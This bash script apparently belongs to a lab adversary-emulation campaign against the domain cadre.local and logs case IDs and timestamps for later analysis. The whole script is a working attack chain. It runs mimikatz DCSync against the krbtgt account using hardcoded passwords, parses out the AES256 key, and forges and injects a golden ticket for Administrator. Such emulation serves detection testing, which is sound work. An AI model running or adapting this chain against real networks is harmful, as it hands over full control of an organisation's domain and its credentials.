#!/usr/bin/env bash
# T010 — Golden ticket from ws01 (post T009 krbtgt hash on ws01)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T010-GOLDEN-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T010 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz

# Domain SID cadre.local from live lab
DOMAIN_SID="S-1-5-21-277764030-1371232215-1561074416"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "C:\\Tools\\cadre-attack\\mimikatz.exe \"lsadump::dcsync /domain:cadre.local /user:CN=krbtgt,CN=Users,DC=cadre,DC=local /dc:dc01.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre.local\" exit 2>&1 | Tee-Object C:\\Tools\\cadre-attack\\dcsync-out.txt; \$aes=(Select-String -Path C:\\Tools\\cadre-attack\\dcsync-out.txt -Pattern 'aes256_hmac\\s+\\(4096\\)\\s+:\\s+(.+)' | Select-Object -First 1).Matches.Groups[1].Value.Trim(); Write-Output \"AES256=\$aes\"; C:\\Tools\\cadre-attack\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:cadre.local /sid:${DOMAIN_SID} /aes256:\$aes /ptt\" \"misc::cmd cmd.exe /c whoami\" exit"

cadre_export "${CASE_ID}" T010 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
